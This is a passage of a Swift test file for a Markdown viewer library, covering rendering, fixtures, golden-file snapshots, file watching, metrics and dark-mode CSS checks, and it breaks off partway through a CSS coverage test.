import Foundation
import MarkViewCore

// Simple test runner — no XCTest dependency required
struct TestRunner {
    var passed = 0
    var failed = 0
    var skipped = 0

    mutating func test(_ name: String, _ body: () throws -> Void) {
        do {
            try body()
            passed += 1
            print("  ✓ \(name)")
        } catch {
            failed += 1
            print("  ✗ \(name): \(error)")
        }
    }

    mutating func skip(_ name: String, reason: String) {
        skipped += 1
        print("  ⊘ \(name) (skipped: \(reason))")
    }

    func summary() {
        print("\nResults: \(passed) passed, \(failed) failed, \(skipped) skipped")
    }
}

func expect(_ condition: Bool, _ message: String = "Assertion failed", file: String = #file, line: Int = #line) throws {
    guard condition else {
        throw TestError.assertionFailed("\(message) (\(URL(fileURLWithPath: file).lastPathComponent):\(line))")
    }
}

enum TestError: Error, CustomStringConvertible {
    case assertionFailed(String)
    case fixtureNotFound(String)

    var description: String {
        switch self {
        case .assertionFailed(let msg): return msg
        case .fixtureNotFound(let name): return "Fixture not found: \(name)"
        }
    }
}

func loadFixture(_ name: String) throws -> String {
    guard let url = Bundle.module.url(forResource: name, withExtension: nil, subdirectory: "Fixtures") else {
        throw TestError.fixtureNotFound(name)
    }
    return try String(contentsOf: url, encoding: .utf8)
}

func normalizeHTML(_ html: String) -> String {
    html.components(separatedBy: .whitespacesAndNewlines)
        .filter { !$0.isEmpty }
        .joined(separator: " ")
}

/// Check if HTML contains an element with the given tag and content.
/// Handles sourcepos attributes: `<p data-sourcepos="1:1-1:5">text</p>` matches `hasTag("p", containing: "text")`.
func hasTag(_ tag: String, in html: String, containing text: String? = nil) -> Bool {
    // Match opening tag with optional attributes
    let pattern = "<\(tag)(\\s[^>]*)?>.*?</\(tag)>"
    guard let regex = try? NSRegularExpression(pattern: pattern, options: .dotMatchesLineSeparators) else { return false }
    let range = NSRange(html.startIndex..., in: html)
    let matches = regex.matches(in: html, range: range)
    if let text = text {
        return matches.contains { match in
            let matchRange = Range(match.range, in: html)!
            return html[matchRange].contains(text)
        }
    }
    return !matches.isEmpty
}

/// Check if HTML contains an opening tag (with optional attributes from sourcepos).
func hasOpenTag(_ tag: String, in html: String) -> Bool {
    let pattern = "<\(tag)(\\s[^>]*)?>|<\(tag)>"
    return html.range(of: pattern, options: .regularExpression) != nil
}

// =============================================================================
// MARK: - CSS Parsing Helpers (for auto-coverage tests)
// =============================================================================

/// Visual CSS properties that must be overridden in dark mode
let visualProperties: Set<String> = [
    "color", "background", "background-color", "border", "border-color",
    "border-top-color", "border-bottom-color", "border-left-color", "border-right-color"
]

struct CSSRule {
    let selector: String
    let properties: [String: String]
}

/// Simple regex-based CSS parser. Extracts selector → property pairs from a CSS block.
/// Does not handle nested @media — call on pre-split light/dark sections.
func parseCSSRules(_ css: String) -> [CSSRule] {
    var rules: [CSSRule] = []

    // Match: selector { ... }
    // Use a simple brace-counting approach for robustness
    let scanner = css as NSString
    let length = scanner.length
    var i = 0

    while i < length {
        // Skip whitespace
        while i < length && (scanner.character(at: i) == 0x20 || scanner.character(at: i) == 0x0A || scanner.character(at: i) == 0x0D || scanner.character(at: i) == 0x09) {
            i += 1
        }
        if i >= length { break }

        // Find the next '{'
        let selectorStart = i
        while i < length && scanner.character(at: i) != 0x7B /* { */ {
            i += 1
        }
        if i >= length { break }

        let selector = scanner.substring(with: NSRange(location: selectorStart, length: i - selectorStart))
            .trimmingCharacters(in: .whitespacesAndNewlines)
        i += 1 // skip '{'

        // Find matching '}'
        var braceDepth = 1
        let bodyStart = i
        while i < length && braceDepth > 0 {
            let ch = scanner.character(at: i)
            if ch == 0x7B { braceDepth += 1 }
            else if ch == 0x7D { braceDepth -= 1 }
            i += 1
        }
        let bodyEnd = i - 1
        if bodyEnd <= bodyStart || selector.isEmpty { continue }

        let body = scanner.substring(with: NSRange(location: bodyStart, length: bodyEnd - bodyStart))

        // Parse property: value pairs
        var props: [String: String] = [:]
        let declarations = body.components(separatedBy: ";")
        for decl in declarations {
            let parts = decl.split(separator: ":", maxSplits: 1)
            if parts.count == 2 {
                let prop = parts[0].trimmingCharacters(in: .whitespacesAndNewlines).lowercased()
                let value = parts[1].trimmingCharacters(in: .whitespacesAndNewlines)
                props[prop] = value
            }
        }

        if !props.isEmpty {
            rules.append(CSSRule(selector: selector, properties: props))
        }
    }

    return rules
}

/// Extract the CSS content between <style> and </style> from full HTML
func extractCSS(from html: String) -> String {
    guard let styleStart = html.range(of: "<style>")?.upperBound ?? html.range(of: "<style id=\"app-css\">")?.upperBound,
          let styleEnd = html.range(of: "</style>")?.lowerBound else { return "" }
    return String(html[styleStart..<styleEnd])
}

/// Split CSS into light-mode rules (before @media dark) and dark-mode rules (inside @media dark)
func splitLightDarkCSS(_ css: String) -> (light: String, dark: String) {
    guard let mediaStart = css.range(of: "@media (prefers-color-scheme: dark)") else {
        return (light: css, dark: "")
    }

    let light = String(css[css.startIndex..<mediaStart.lowerBound])

    // Find the opening brace after the media query
    let afterMedia = css[mediaStart.upperBound...]
    guard let braceStart = afterMedia.firstIndex(of: "{") else {
        return (light: light, dark: "")
    }

    // Find matching closing brace
    var depth = 1
    var idx = css.index(after: braceStart)
    while idx < css.endIndex && depth > 0 {
        if css[idx] == "{" { depth += 1 }
        else if css[idx] == "}" { depth -= 1 }
        idx = css.index(after: idx)
    }
    let braceEnd = css.index(before: idx)
    let dark = String(css[css.index(after: braceStart)..<braceEnd])

    // Also get any CSS after the dark block (it's still light-mode)
    let afterDark = String(css[idx...])
    return (light: light + afterDark, dark: dark)
}

// =============================================================================
// MARK: - Golden File Support
// =============================================================================

let fixtureNames = [
    "basic", "gfm-tables", "gfm-tasklists", "gfm-strikethrough",
    "gfm-autolinks", "code-blocks", "links-and-images", "edge-cases"
]

func goldenFilePath(for fixtureName: String) -> URL? {
    Bundle.module.url(forResource: fixtureName, withExtension: "html", subdirectory: "Fixtures/expected")
}

func generateGoldens() throws {
    // Write to the SOURCE tree, not the bundle copy
    // Locate the project root by finding Package.swift
    let cwd = FileManager.default.currentDirectoryPath
    let expectedDir = URL(fileURLWithPath: cwd)
        .appendingPathComponent("Tests/TestRunner/Fixtures/expected")
    try FileManager.default.createDirectory(at: expectedDir, withIntermediateDirectories: true)

    for name in fixtureNames {
        let md = try loadFixture("\(name).md")
        let html = MarkdownRenderer.renderHTML(from: md)
        let outURL = expectedDir.appendingPathComponent("\(name).html")
        try html.write(to: outURL, atomically: true, encoding: .utf8)
        print("  Generated: \(name).html (\(html.count) bytes)")
    }

    // Also generate full-template versions
    let templateDir = expectedDir.appendingPathComponent("full-template")
    try FileManager.default.createDirectory(at: templateDir, withIntermediateDirectories: true)
    for name in fixtureNames {
        let md = try loadFixture("\(name).md")
        let bodyHTML = MarkdownRenderer.renderHTML(from: md)
        let fullHTML = MarkdownRenderer.wrapInTemplate(bodyHTML)
        let outURL = templateDir.appendingPathComponent("\(name).html")
        try fullHTML.write(to: outURL, atomically: true, encoding: .utf8)
        print("  Generated: full-template/\(name).html (\(fullHTML.count) bytes)")
    }

    // Generate Quick Look pipeline goldens (renderHTML + postProcessForAccessibility + wrapInTemplate)
    let qlDir = expectedDir.appendingPathComponent("quick-look")
    try FileManager.default.createDirectory(at: qlDir, withIntermediateDirectories: true)
    for name in fixtureNames {
        let md = try loadFixture("\(name).md")
        let bodyHTML = MarkdownRenderer.renderHTML(from: md)
        let accessible = MarkdownRenderer.postProcessForAccessibility(bodyHTML)
        let fullHTML = MarkdownRenderer.wrapInTemplate(accessible)
        let outURL = qlDir.appendingPathComponent("\(name).html")
        try fullHTML.write(to: outURL, atomically: true, encoding: .utf8)
        print("  Generated: quick-look/\(name).html (\(fullHTML.count) bytes)")
    }

    print("\nGolden files generated. Commit these to lock in the baseline.")
}

/// Compute a line-by-line diff between two strings, returning differing lines
func computeDiff(_ expected: String, _ actual: String) -> [(line: Int, expected: String, actual: String)] {
    let expectedLines = expected.components(separatedBy: "\n")
    let actualLines = actual.components(separatedBy: "\n")
    var diffs: [(line: Int, expected: String, actual: String)] = []

    let maxLines = max(expectedLines.count, actualLines.count)
    for i in 0..<maxLines {
        let exp = i < expectedLines.count ? expectedLines[i] : "<missing>"
        let act = i < actualLines.count ? actualLines[i] : "<missing>"
        if exp != act {
            diffs.append((line: i + 1, expected: exp, actual: act))
        }
    }
    return diffs
}

// =============================================================================
// MARK: - CLI Mode Selection
// =============================================================================

if CommandLine.arguments.contains("--generate-goldens") {
    print("=== Generating Golden Files ===")
    do {
        try generateGoldens()
        print("\nDone.")
        exit(0)
    } catch {
        print("Error generating goldens: \(error)")
        exit(1)
    }
}

// =============================================================================
// MARK: - Tests
// =============================================================================

var runner = TestRunner()

print("=== Tier 0: Build ===")
print("  ✓ Build succeeded (you're running this)")
runner.passed += 1

// MARK: - Renderer Tests

print("\n=== Tier 1: Renderer Unit Tests ===")

runner.test("empty string renders empty") {
    let html = MarkdownRenderer.renderHTML(from: "")
    try expect(html == "", "Expected empty string, got: \(html)")
}

runner.test("paragraph renders") {
    let html = MarkdownRenderer.renderHTML(from: "Hello world")
    try expect(hasTag("p", in: html, containing: "Hello world"), "Missing paragraph tag")
}

runner.test("headers h1-h6") {
    for level in 1...6 {
        let prefix = String(repeating: "#", count: level)
        let html = MarkdownRenderer.renderHTML(from: "\(prefix) Heading \(level)")
        try expect(hasTag("h\(level)", in: html, containing: "Heading \(level)"), "Failed for h\(level)")
    }
}

runner.test("bold") {
    let html = MarkdownRenderer.renderHTML(from: "**bold text**")
    try expect(html.contains("<strong>bold text</strong>"), "Missing bold")
}

runner.test("italic") {
    let html = MarkdownRenderer.renderHTML(from: "*italic text*")
    try expect(html.contains("<em>italic text</em>"), "Missing italic")
}

runner.test("bold and italic") {
    let html = MarkdownRenderer.renderHTML(from: "***bold and italic***")
    try expect(html.contains("<strong>") && html.contains("<em>"), "Missing bold+italic")
}

runner.test("inline code") {
    let html = MarkdownRenderer.renderHTML(from: "Use `git status` to check")
    try expect(html.contains("<code>git status</code>"), "Missing inline code")
}

runner.test("blockquote") {
    let html = MarkdownRenderer.renderHTML(from: "> This is a quote")
    try expect(hasOpenTag("blockquote", in: html), "Missing blockquote")
}

runner.test("horizontal rule") {
    let html = MarkdownRenderer.renderHTML(from: "---")
    try expect(html.contains("<hr"), "Missing hr")
}

runner.test("link") {
    let html = MarkdownRenderer.renderHTML(from: "[GitHub](https://github.com)")
    try expect(html.contains("<a href=\"https://github.com\">GitHub</a>"), "Missing link")
}

runner.test("image") {
    let html = MarkdownRenderer.renderHTML(from: "![Alt text](image.png)")
    try expect(html.contains("<img src=\"image.png\" alt=\"Alt text\""), "Missing image")
}

// MARK: - GFM Extension Tests

print("\n=== Tier 1: GFM Extension Tests ===")

runner.test("GFM table") {
    let md = "| Name | Age |\n|------|-----|\n| Alice | 30 |"
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(hasOpenTag("table", in: html), "Missing table")
    try expect(hasTag("th", in: html, containing: "Name"), "Missing th")
    try expect(hasTag("td", in: html, containing: "Alice"), "Missing td")
}

runner.test("GFM table alignment") {
    let md = "| Left | Center | Right |\n|:-----|:------:|------:|\n| L | C | R |"
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("align=\"center\"") || html.contains("text-align: center"), "Missing center align")
    try expect(html.contains("align=\"right\"") || html.contains("text-align: right"), "Missing right align")
}

runner.test("GFM strikethrough") {
    let html = MarkdownRenderer.renderHTML(from: "~~deleted text~~")
    try expect(html.contains("<del>deleted text</del>"), "Missing strikethrough")
}

runner.test("GFM task list") {
    let md = "- [x] Done\n- [ ] Not done"
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("checked"), "Missing checked attribute")
    try expect(html.contains("type=\"checkbox\""), "Missing checkbox")
}

runner.test("GFM autolink") {
    let html = MarkdownRenderer.renderHTML(from: "Visit https://example.com for info")
    try expect(html.contains("<a href=\"https://example.com\">"), "Missing autolink")
}

runner.test("fenced code block with language") {
    let md = "```python\ndef hello():\n    pass\n```"
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(hasOpenTag("pre", in: html), "Missing pre")
    try expect(html.contains("language-python"), "Missing language class")
}

// MARK: - Edge Cases

print("\n=== Tier 1: Edge Case Tests ===")

runner.test("unicode content") {
    let html = MarkdownRenderer.renderHTML(from: "Hello 世界 🌍")
    try expect(html.contains("Hello 世界 🌍"), "Unicode not preserved")
}

runner.test("nested blockquotes") {
    let md = "> Level 1\n>> Level 2\n>>> Level 3"
    let html = MarkdownRenderer.renderHTML(from: md)
    let pattern = "<blockquote(\\s[^>]*)?>|<blockquote>"
    let count = (html.range(of: pattern, options: .regularExpression) != nil) ?
        html.components(separatedBy: "blockquote").count / 2 : 0
    try expect(count >= 2, "Expected nested blockquotes, got \(count)")
}

runner.test("smart punctuation") {
    let html = MarkdownRenderer.renderHTML(from: "\"quotes\"")
    try expect(html.contains("\u{201C}") || html.contains("&ldquo;") || html.contains("\""),
               "Smart quotes not working")
}

runner.test("template wrapping") {
    let html = MarkdownRenderer.wrapInTemplate("<p>Hello</p>")
    try expect(html.contains("<!DOCTYPE html>"), "Missing doctype")
    try expect(html.contains("<p>Hello</p>"), "Missing content")
    try expect(html.contains("</html>"), "Missing closing html")
}

runner.test("custom template") {
    let template = "<html><body>{{CONTENT}}</body></html>"
    let html = MarkdownRenderer.wrapInTemplate("<p>Test</p>", template: template)
    try expect(html == "<html><body><p>Test</p></body></html>", "Custom template failed")
}

// MARK: - Fixture-Based GFM Compliance

print("\n=== Tier 2: GFM Compliance (Fixture-Based) ===")

runner.test("basic.md fixture renders") {
    let md = try loadFixture("basic.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(hasOpenTag("h1", in: html), "Missing h1 in basic.md")
    try expect(html.contains("<strong>"), "Missing bold in basic.md")
    try expect(html.contains("<em>"), "Missing italic in basic.md")
    try expect(hasOpenTag("blockquote", in: html), "Missing blockquote in basic.md")
    try expect(html.contains("<hr"), "Missing hr in basic.md")
}

runner.test("gfm-tables.md fixture renders") {
    let md = try loadFixture("gfm-tables.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(hasOpenTag("table", in: html), "Missing table")
    try expect(hasOpenTag("th", in: html), "Missing th")
    try expect(hasOpenTag("td", in: html), "Missing td")
    try expect(html.contains("align="), "Missing alignment")
}

runner.test("gfm-tasklists.md fixture renders") {
    let md = try loadFixture("gfm-tasklists.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("type=\"checkbox\""), "Missing checkboxes")
    try expect(html.contains("checked"), "Missing checked items")
}

runner.test("gfm-strikethrough.md fixture renders") {
    let md = try loadFixture("gfm-strikethrough.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("<del>"), "Missing strikethrough")
}

runner.test("gfm-autolinks.md fixture renders") {
    let md = try loadFixture("gfm-autolinks.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("<a href="), "Missing autolinks")
}

runner.test("code-blocks.md fixture renders") {
    let md = try loadFixture("code-blocks.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(hasOpenTag("pre", in: html), "Missing code blocks")
    try expect(html.contains("language-python"), "Missing python language")
    try expect(html.contains("language-swift"), "Missing swift language")
    try expect(html.contains("language-javascript"), "Missing javascript language")
    try expect(html.contains("language-rust"), "Missing rust language")
    try expect(html.contains("language-go"), "Missing go language")
    try expect(html.contains("language-bash"), "Missing bash language")
    try expect(html.contains("language-typescript"), "Missing typescript language")
}

runner.test("links-and-images.md fixture renders") {
    let md = try loadFixture("links-and-images.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("<a href="), "Missing links")
    try expect(html.contains("<img"), "Missing images")
}

runner.test("edge-cases.md fixture renders") {
    let md = try loadFixture("edge-cases.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(!html.isEmpty, "Edge cases produced empty output")
    try expect(html.contains("这是一个测试段落"), "Missing Chinese unicode")
    try expect(html.contains("🚀"), "Missing emoji")
}

// MARK: - Performance

print("\n=== Tier 2: Performance ===")

runner.test("large file renders under 500ms") {
    let md = try loadFixture("large-file.md")
    let start = CFAbsoluteTimeGetCurrent()
    _ = MarkdownRenderer.renderHTML(from: md)
    let elapsed = (CFAbsoluteTimeGetCurrent() - start) * 1000
    print("    Render time: \(String(format: "%.1f", elapsed))ms for \(md.count) bytes")
    try expect(elapsed < 500, "Render took \(elapsed)ms, expected < 500ms")
}

runner.test("large file performance (10 iterations)") {
    let md = try loadFixture("large-file.md")
    var totalMs = 0.0
    for _ in 0..<10 {
        let start = CFAbsoluteTimeGetCurrent()
        _ = MarkdownRenderer.renderHTML(from: md)
        totalMs += (CFAbsoluteTimeGetCurrent() - start) * 1000
    }
    let avgMs = totalMs / 10.0
    print("    Average: \(String(format: "%.1f", avgMs))ms per render")
}

// MARK: - FileWatcher Tests

print("\n=== Tier 1: FileWatcher Tests ===")

runner.test("FileWatcher detects direct write") {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent("mvtest-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: dir) }

    let file = dir.appendingPathComponent("test.md")
    try "# Original".write(to: file, atomically: true, encoding: .utf8)

    let sem = DispatchSemaphore(value: 0)
    let watcher = FileWatcher(path: file.path) { sem.signal() }
    watcher.start()

    Thread.sleep(forTimeInterval: 0.2)
    try "# Modified".write(to: file, atomically: false, encoding: .utf8)

    let result = sem.wait(timeout: .now() + 3.0)
    watcher.stop()
    try expect(result == .success, "FileWatcher did not detect write within 3s")
}

runner.test("FileWatcher detects atomic save") {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent("mvtest-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: dir) }

    let file = dir.appendingPathComponent("test.md")
    try "# Original".write(to: file, atomically: true, encoding: .utf8)

    let sem = DispatchSemaphore(value: 0)
    let watcher = FileWatcher(path: file.path) { sem.signal() }
    watcher.start()

    Thread.sleep(forTimeInterval: 0.2)
    let tmpFile = dir.appendingPathComponent("test.md.tmp")
    try "# Atomic save".write(to: tmpFile, atomically: false, encoding: .utf8)
    _ = try FileManager.default.replaceItemAt(file, withItemAt: tmpFile)

    let result = sem.wait(timeout: .now() + 3.0)
    watcher.stop()
    try expect(result == .success, "FileWatcher did not detect atomic save within 3s")
}

runner.test("FileWatcher stop prevents notifications") {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent("mvtest-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: dir) }

    let file = dir.appendingPathComponent("test.md")
    try "# Original".write(to: file, atomically: true, encoding: .utf8)

    var called = false
    let watcher = FileWatcher(path: file.path) { called = true }
    watcher.start()
    watcher.stop()

    try "# Should not trigger".write(to: file, atomically: false, encoding: .utf8)
    Thread.sleep(forTimeInterval: 0.5)
    try expect(!called, "Received notification after stop")
}

// MARK: - Word Count / Stats Tests

print("\n=== Tier 1: Word Count / Stats Tests ===")

func wordCount(_ text: String) -> Int {
    text.split(whereSeparator: { $0.isWhitespace || $0.isNewline }).count
}

func lineCount(_ text: String) -> Int {
    text.isEmpty ? 0 : text.components(separatedBy: .newlines).count
}

runner.test("word count basic") {
    try expect(wordCount("Hello world") == 2, "Expected 2 words")
    try expect(wordCount("One two three four five") == 5, "Expected 5 words")
}

runner.test("word count with markdown") {
    // "# Heading\n\nA paragraph with **bold**." splits to: #, Heading, A, paragraph, with, **bold**.
    try expect(wordCount("# Heading\n\nA paragraph with **bold**.") == 6, "Expected 6 words")
}

runner.test("word count empty") {
    try expect(wordCount("") == 0, "Expected 0 words for empty string")
}

runner.test("line count") {
    try expect(lineCount("one\ntwo\nthree") == 3, "Expected 3 lines")
    try expect(lineCount("single line") == 1, "Expected 1 line")
    try expect(lineCount("") == 0, "Expected 0 lines for empty")
}

// MARK: - Renderer Stress Tests

print("\n=== Tier 2: Renderer Stress Tests ===")

runner.test("empty document renders gracefully") {
    let html = MarkdownRenderer.renderHTML(from: "")
    try expect(html.isEmpty, "Empty input should produce empty output")
}

runner.test("whitespace-only document") {
    let html = MarkdownRenderer.renderHTML(from: "   \n\n   \n\t\t\n   ")
    // Should not crash, may produce empty or whitespace
    _ = html // Just checking it doesn't crash
}

runner.test("very long single line") {
    let longLine = String(repeating: "word ", count: 10000)
    let html = MarkdownRenderer.renderHTML(from: longLine)
    try expect(html.contains("word"), "Long line should render")
}

runner.test("deeply nested lists") {
    var md = ""
    for i in 0..<20 {
        md += String(repeating: "  ", count: i) + "- Level \(i)\n"
    }
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(hasOpenTag("ul", in: html), "Nested lists should render")
}

runner.test("many consecutive headings") {
    var md = ""
    for i in 1...100 {
        md += "## Heading \(i)\n\n"
    }
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("Heading 1"), "First heading should render")
    try expect(html.contains("Heading 100"), "Last heading should render")
}

runner.test("mixed GFM features in one document") {
    let md = """
    # Title

    | Col A | Col B |
    |-------|-------|
    | ~~old~~ | **new** |

    - [x] Done task with `code`
    - [ ] Pending task with [link](https://example.com)

    > Blockquote with https://auto.link

    ```swift
    let x = 42
    ```
    """
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(hasOpenTag("table", in: html), "Table should render")
    try expect(html.contains("<del>"), "Strikethrough should render")
    try expect(html.contains("checkbox"), "Task list should render")
    try expect(hasOpenTag("blockquote", in: html), "Blockquote should render")
    try expect(html.contains("language-swift"), "Code block should render")
    try expect(html.contains("<a href="), "Links should render")
}

// MARK: - Metrics Tests

print("\n=== Tier 1: Metrics Tests ===")

runner.test("metrics disabled by default") {
    let metrics = MetricsCollector.shared
    // Should not crash when disabled
    metrics.trackFileOpened(sizeBytes: 1000)
    metrics.trackRender(durationMs: 5.0)
    metrics.trackExport(format: "html")
    metrics.trackFeature("editor")
    metrics.flush()
    // All good if no crash
}

runner.test("metrics aggregate loads without file") {
    let metrics = MetricsCollector.shared
    metrics.clearAll()
    let aggregate = metrics.loadAggregate()
    try expect(aggregate.totalSessions == 0, "Expected 0 sessions for fresh metrics")
    try expect(aggregate.totalFilesOpened == 0, "Expected 0 files for fresh metrics")
}

runner.test("metrics enabled tracks and persists") {
    let metrics = MetricsCollector.shared
    metrics.clearAll()
    metrics.setEnabled(true)
    metrics.trackFileOpened(sizeBytes: 5000)
    metrics.trackRender(durationMs: 3.5)
    metrics.trackRender(durationMs: 2.0)
    metrics.trackFeature("editor")
    metrics.trackFeature("export")
    metrics.trackEditorUsed()
    metrics.flush()

    let aggregate = metrics.loadAggregate()
    try expect(aggregate.totalSessions == 1, "Expected 1 session, got \(aggregate.totalSessions)")
    try expect(aggregate.totalFilesOpened == 1, "Expected 1 file opened")
    try expect(aggregate.totalRenders == 2, "Expected 2 renders")
    try expect(aggregate.largestFileEverBytes == 5000, "Expected 5000 bytes")
    try expect(aggregate.editorSessionCount == 1, "Expected 1 editor session")
    try expect(aggregate.featureUsageCounts["editor"] == 1, "Expected editor feature tracked")
    try expect(aggregate.featureUsageCounts["export"] == 1, "Expected export feature tracked")

    // Clean up
    metrics.clearAll()
    metrics.setEnabled(false)
}

// MARK: - Tier 3: Golden File Snapshot Regression Tests

print("\n=== Tier 3: Golden File Snapshot Regression ===")

do {
    // Check if golden files exist
    let firstGolden = goldenFilePath(for: "basic")
    if firstGolden != nil {
        for name in fixtureNames {
            runner.test("\(name) matches golden baseline") {
                let md = try loadFixture("\(name).md")
                let actual = MarkdownRenderer.renderHTML(from: md)
                guard let goldenURL = goldenFilePath(for: name) else {
                    throw TestError.fixtureNotFound("expected/\(name).html")
                }
                let expected = try String(contentsOf: goldenURL, encoding: .utf8)

                if normalizeHTML(actual) != normalizeHTML(expected) {
                    let diffs = computeDiff(expected, actual)
                    let diffSummary = diffs.prefix(3).map { "    L\($0.line): expected=\($0.expected.prefix(80)) actual=\($0.actual.prefix(80))" }.joined(separator: "\n")
                    throw TestError.assertionFailed("Output changed for \(name).md (\(diffs.count) lines differ):\n\(diffSummary)")
                }
            }
        }
    } else {
        print("  ⚠ No golden files found. Run with --generate-goldens to create baselines.")
    }
}

// MARK: - Tier 3: Full-Template E2E Tests

print("\n=== Tier 3: Full-Template E2E ===")

runner.test("full HTML document is well-formed") {
    let md = try loadFixture("basic.md")
    let body = MarkdownRenderer.renderHTML(from: md)
    let full = MarkdownRenderer.wrapInTemplate(body)

    try expect(full.hasPrefix("<!DOCTYPE html>") || full.contains("<!DOCTYPE html>"), "Missing DOCTYPE")
    try expect(full.contains("<html"), "Missing <html>")
    try expect(full.contains("</html>"), "Missing </html>")
    try expect(full.contains("<head>"), "Missing <head>")
    try expect(full.contains("</head>"), "Missing </head>")
    try expect(full.contains("<body>"), "Missing <body>")
    try expect(full.contains("</body>"), "Missing </body>")
    try expect(full.contains("<meta charset=\"utf-8\">"), "Missing charset meta")
    try expect(full.contains("<style>"), "Missing style block")
}

runner.test("full template contains all CSS rules") {
    let body = MarkdownRenderer.renderHTML(from: "# Test")
    let full = MarkdownRenderer.wrapInTemplate(body)

    // Key CSS features for GitHub-style rendering
    try expect(full.contains("font-family:"), "Missing font-family")
    try expect(full.contains("max-width:"), "Missing max-width")
    try expect(full.contains("prefers-color-scheme: dark"), "Missing dark mode support")
    try expect(full.contains("border-collapse"), "Missing table CSS")
    try expect(full.contains("border-radius"), "Missing code block border-radius")
    try expect(full.contains("monospace"), "Missing monospace font for code")
}

runner.test("full template renders all GFM features in context") {
    let md = """
    # Full E2E Test

    | Feature | Status |
    |---------|--------|
    | Tables | ✅ |

    - [x] Task lists
    - [ ] More tasks

    ~~struck~~ and **bold** and `code`

    > Blockquote

    ```swift
    let x = 1
    ```

    Visit https://example.com
    """
    let body = MarkdownRenderer.renderHTML(from: md)
    let full = MarkdownRenderer.wrapInTemplate(body)

    // Verify all features present in final document
    try expect(hasTag("h1", in: full, containing: "Full E2E Test"), "Missing heading")
    try expect(hasOpenTag("table", in: full), "Missing table")
    try expect(full.contains("checkbox"), "Missing task list checkboxes")
    try expect(full.contains("<del>struck</del>"), "Missing strikethrough")
    try expect(full.contains("<strong>bold</strong>"), "Missing bold")
    try expect(full.contains("<code>code</code>"), "Missing inline code")
    try expect(hasOpenTag("blockquote", in: full), "Missing blockquote")
    try expect(full.contains("language-swift"), "Missing code block language")
    try expect(full.contains("<a href=\"https://example.com\""), "Missing autolink")
}

runner.test("full template dark mode CSS is complete") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")

    // Verify dark mode has all necessary overrides
    try expect(full.contains("color: #e6edf3"), "Missing dark text color")
    try expect(full.contains("background: #0d1117"), "Missing dark background")
    try expect(full.contains("#161b22"), "Missing dark code background")
    try expect(full.contains("#3d444d"), "Missing dark border color")
}

runner.test("dark mode CSS covers all styled elements") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")

    // The dark mode media query must override every element that has a visible background/color in light mode
    let requiredDarkOverrides = [
        ("body", "body text/background"),
        ("th", "table header"),
        ("tr:nth-child(2n)", "alternating table rows"),
        ("blockquote", "blockquote"),
        ("hr", "horizontal rule"),
        ("h1, h2", "heading borders"),
        ("a {", "link color"),
        ("code:not(", "inline code"),
    ]

    for (selector, description) in requiredDarkOverrides {
        // Check the selector appears after the dark mode media query declaration
        guard let darkStart = full.range(of: "@media (prefers-color-scheme: dark)") else {
            throw TestError.assertionFailed("No dark mode media query found")
        }
        let afterDark = String(full[darkStart.upperBound...])
        try expect(afterDark.contains(selector),
                  "Dark mode missing override for \(description) ('\(selector)')")
    }
}

runner.test("dark mode table has proper contrast (GitHub Primer)") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")

    guard let darkStart = full.range(of: "@media (prefers-color-scheme: dark)") else {
        throw TestError.assertionFailed("No dark mode media query found")
    }
    let afterDark = String(full[darkStart.upperBound...])

    // Alternating rows use subtle dark background (#151b23), not same as body (#0d1117)
    try expect(afterDark.contains("#151b23"), "Dark mode alternating rows should use #151b23")

    // Borders should use GitHub dark border color #3d444d
    try expect(afterDark.contains("#3d444d"), "Dark mode borders should use #3d444d")
}

runner.test("dark mode inherits text color from body") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")

    guard let darkStart = full.range(of: "@media (prefers-color-scheme: dark)") else {
        throw TestError.assertionFailed("No dark mode media query found")
    }
    let afterDark = String(full[darkStart.upperBound...])

    // Body sets light text color — table cells inherit it (GitHub Primer approach)
    try expect(afterDark.contains("body") && afterDark.contains("color: #e6edf3"),
              "Dark mode body must set light text color for inheritance")
}

runner.test("dark mode inline code has explicit text color") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")

    guard let darkStart = full.range(of: "@media (prefers-color-scheme: dark)") else {
        throw TestError.assertionFailed("No dark mode media query found")
    }
    let afterDark = String(full[darkStart.upperBound...])

    // Inline code must set both background AND color — relying on inheritance
    // can leave dark text (#1f2328) on dark background (#343942)
    guard let codeRule = afterDark.range(of: "code:not(") else {
        throw TestError.assertionFailed("Dark mode missing inline code rule")
    }
    let ruleEnd = afterDark[codeRule.upperBound...].prefix(200)
    try expect(ruleEnd.contains("color:"),
              "Dark mode inline code must set explicit text color (not just background)")
}

// MARK: - Auto-Parsed CSS Dark Mode Coverage

runner.test("dark mode auto-coverage: every styled element has dark override") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")
    let css = extractCSS(from: full)
    let (lightCSS, darkCSS) = splitLightDarkCSS(css)

    let lightRules = parseCSSRules(lightCSS)
    let darkRules = parseCSSRules(darkCSS)

    // Build a set of dark-mode selectors → properties for lookup
    var darkOverrides: [String: Set<String>] = [:]
    for rule in darkRules {
